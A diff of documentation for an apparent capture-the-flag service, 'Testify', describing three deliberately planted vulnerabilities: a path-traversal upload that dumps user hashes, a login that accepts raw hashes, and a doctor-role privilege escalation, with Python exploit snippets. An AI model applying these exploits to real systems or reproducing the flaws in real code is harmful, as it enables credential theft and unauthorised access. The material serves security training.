@@ -1,10 +1,10 @@
 Testify Service documentation
 ======================
 
-# <ins>Vulnerabilities
+# <ins>Vulnerabilities (3)
 
-The Testify Service consists of two different Vulnerabilities which must be exploited after each other to get access to
-the FLAGSTORE
+The Testify Service consists of three different Vulnerabilities. Two of them must be exploited after each other to access FLAGSTORE #1.
+The third VULN leads to FLAGSTORE #2
 
 ## VULN #1: User Password Hash Exposure
 
@@ -24,6 +24,17 @@ The password is not allowed to contain any special characters other than ASCII. 
 that does include non-ASCII characters (*e.g. a password hash obtained by VULN#1*) the hashing of the input password
 string is skipped and directly compared to the hash in the user credential databse.
 
+
+## VULN #3 User Privilege Escalation
+
+- Category: User Privelege Administration
+- Difficulty: Easy
+
+When a user makes an appointment, an additional info for the doctor is submitted optionally (FLAGSTORE). This info can only
+be viewed by a doctor having set the `is_doctor` attribute in the DB (doctor01,...,doctor05). However the `check_doctor()` 
+function also checks whether the accessing user shows up as a assigned doctor in the `appointment` table of the DB. If so, 
+the user is also considered a doctor and access to the info field (FLAGSTORE) of any user is granted.
+
 # <ins>Exploits
 
 Two different exploits for VULN#1 and VULN#2 need to be run after each other to obtain a flag.
@@ -36,27 +47,21 @@ Two different exploits for VULN#1 and VULN#2 need to be run after each other to 
 ### Code
 
 ```
-    def get_dump_file():
-        filename = '../online_users/dump.sql'
-        session_id = register(user, password)
-        data = {
-            'prename': 'Paul',
-            'lastname': 'Meyer',
-            'date': '2021-05-06',
-            'time': '02:56'
-        }
-        cookies = {
-            'sessionID': session_id,
-            'username': user
-        }
+        self.register(username, password)
+        self.http_get('/about')
         
-        files = {'id_image': (filename, 'filestring', 'application/octet-stream')}
-        req = requests.post('http://localhost:8597/make_appointment', data=data, files=files, cookies=cookies)
-        result = req.search('Successfully made appointment &lt;(.*)&gt', res.text)
-        url = 'http://localhost:8597/get_id' + result.group(1)
+        filename = '../online_users/dump.sql'
 
-        download = requests.get(url, allow_redirects=True, cookies=cookies)
-        return download.content
+        app_id = self.make_appointment(prename, lastname, filename, date, time, file, 'doctor0' + str(random.randint(1, 5)), pin)
+        route = '/get_id' + str(app_id)
+
+        kwargs = {
+            'allow_redirects': True
+        }
+
+        res = self.http_get(route, **kwargs)
+        sql_string = res.content.decode('ascii').splitlines()
+        user_list = [i.split(',')[1:3] for i in sql_string]
 ```
 
 ## VULN #2 :
@@ -76,4 +81,29 @@ Two different exploits for VULN#1 and VULN#2 need to be run after each other to 
         }
         req = requests.post('http://localhost:8597/login', data=obj)
         return req.text
+```
+
+## VULN #3 :
+
+1. Create appointment with a new user while stating this user as the doctor in the make_appointment form (using POST-request)
+2. Access the `/doctors` page to retrieve the info for the users returned by `/about` page 
+
+### Code
+
+```
+    self.register(username, password)
+
+    app_id = self.make_appointment(prename, lastname, filename, date, time, file, username, pin)
+
+    text = self.http_get('/about').text
+    splits = text[text.find('onlineUsers'):].split('&#39;')
+    splits = splits[1:]
+    del splits[1::2]
+    for s in splits:
+        kwargs = {'data': {'patient_username': s},
+                  'allow_redirects': True}
+        pot_flag = self.http_post('/doctors', **kwargs)
+
+        if flag := self.search_flag(pot_flag.text):
+            return flag
 ```
